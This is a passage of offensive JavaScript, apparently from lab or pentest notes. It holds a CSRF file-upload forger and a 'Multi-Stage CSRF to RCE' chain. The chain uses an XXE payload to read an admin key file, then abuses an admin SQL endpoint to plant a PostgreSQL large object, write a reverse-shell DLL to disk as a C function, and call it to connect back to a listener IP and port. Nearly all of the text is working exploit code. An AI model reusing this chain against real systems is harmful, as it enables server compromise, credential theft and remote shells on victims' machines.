	  xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary="+boundary); // simulate a file MIME POST request.
	  xhr.setRequestHeader("Content-Length", fileSize);
	  xhr.withCredentials = "true";
 
	  xhr.onreadystatechange = function() {
	    console.log(xhr.responseText);
	  }
	  
	  var body = "";
	  
	  for (var i in additionalFields) {
		  if (additionalFields.hasOwnProperty(i)) {
			  body += addField(i, additionalFields[i], boundary);
		  }
	  }

	  body += addFileField(fileFieldName, fileData, fileName, boundary);
	  body += "--" + boundary + "--";
	  xhr.sendAsBinary(body);
	  return true;
}

function addField(name, value, boundary) {
	var c = "--" + boundary + "\r\n"
	c += "Content-Disposition: form-data; name='" + name + "'\r\n\r\n";
	c += value + "\r\n";
	return c;
}

function addFileField(name, value, filename, boundary) {
    var c = "--" + boundary + "\r\n"
    c += "Content-Disposition: form-data; name='" + name + "'; filename='" + filename + "'\r\n";
    c += "Content-Type: application/x-compressed\r\n\r\n";
    c += value + "\r\n";
    return c;	
}

var start = function() {
	var c = "HEX-FILE-DATA"
	fileUpload(c, "FILE-NAME");
};

start();

=========================================================
Multi-Stage CSRF to RCE - Postgre SQLI UDF:

/*
var script = document.createElement('script');
script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);

fetch('https://reqres.in/api/users',{
    method: 'POST',
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify({
        name: 'User 1'
    })
})
.then(res => res.json())
.then(data => console.log(data))
*/

var nc_ip = "192.168.119.125";
var nc_port = "4444";
var loid = 1337;
//xxd rev_shell.dll | cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
var udf="";

var url= "/admin/query";
var admin_key = '';

//function to call inside ajax callback 
function set_admin_key(x){
    admin_key = x;
 }

function make_request(url, body){
    var resp;

    $.ajax({
        url : url,
        type : "POST",
        data: body,
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        async: false,
        success : function(responseText) {
            resp = responseText;
        }
     });

return resp;
}

function retrieve_admin_key() { 
    var url = "/admin/import";
    var body = "preview=true&xmldata=%3C%21--%3Fxml+version%3D%221.0%22+%3F--%3E%0D%0A%3C%21DOCTYPE+replace+%5B%3C%21ENTITY+ent+SYSTEM+%22file%3A%2F%2F%2Fhome%2Fstudent%2Fadminkey.txt%22%3E+%5D%3E%0D%0A%3Cdatabase%3E%26ent%3B%3C%2Fdatabase%3E";
    //var a = make_request(url, body);
  
    let admin_key = $(make_request(url, body)).find("database").text().replace(/\n/g, '');
    console.log("[+] Retrieved admin_key: "+admin_key+"...");
    set_admin_key(admin_key);
}

function delete_lo() {
    console.log("[+] Deleting existing LO...");
    body="adminKey="+admin_key+"&query=SELECT+lo_unlink%28"+loid+"%29";
    make_request(url, body);
}

function create_lo() {
    console.log("[+] Creating LO for UDF injection...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_import($$C:\\windows\\win.ini$$,"+loid+")"; Windows
    make_request(url, body);
}

function inject_udf(){
   console.log("[+] Injecting payload of length %d into LO...");

   for ( let i = 0; i < ((udf.length-1)/4096)+1; i++ ){
         var udf_chunk = udf.substring(i*4096,(i+1)*4096);
         if(i == 0){
            body = "adminKey="+admin_key+"&query=UPDATE+PG_LARGEOBJECT+SET+data=decode($$"+udf_chunk+"$$,$$hex$$)+where+loid="+loid+"+and+pageno="+i+"";
         }
          else{
            body = "adminKey="+admin_key+"&query=INSERT+INTO+PG_LARGEOBJECT+(loid,pageno,data)+VALUES+("+loid+","+i+",decode($$"+udf_chunk+"$$,$$hex$$))";
          }

    make_request(url, body);
        }
}

function export_udf() {
    console.log("[+] Exporting UDF library to filesystem...");
    body = "adminKey="+admin_key+"&query=SELECT+lo_export("+loid+",$$//tmp//rev_shell.obj$$)";
    make_request(url, body);
}

function create_udf_func() {
    console.log("[+] Creating function...");
    body = "adminKey="+admin_key+"&query=create+or+replace+function+rev_shell(text,integer)+returns+VOID+as+$$//tmp//rev_shell.obj$$,$$connect_back$$+language+C+strict"; 
    make_request(url, body);
}

function trigger_udf() {
    console.log("[+] Launching reverse shell...");
    body = "adminKey="+admin_key+"&query=select+rev_shell($$"+nc_ip+"$$,"+nc_port+")";
    make_request(url, body);
}

function launch(){
    retrieve_admin_key();
    delete_lo();
    create_lo();
    inject_udf();
    export_udf();
    create_udf_func();
    trigger_udf();
}

//Slight dealay to let jquery load
setTimeout(launch,1000);


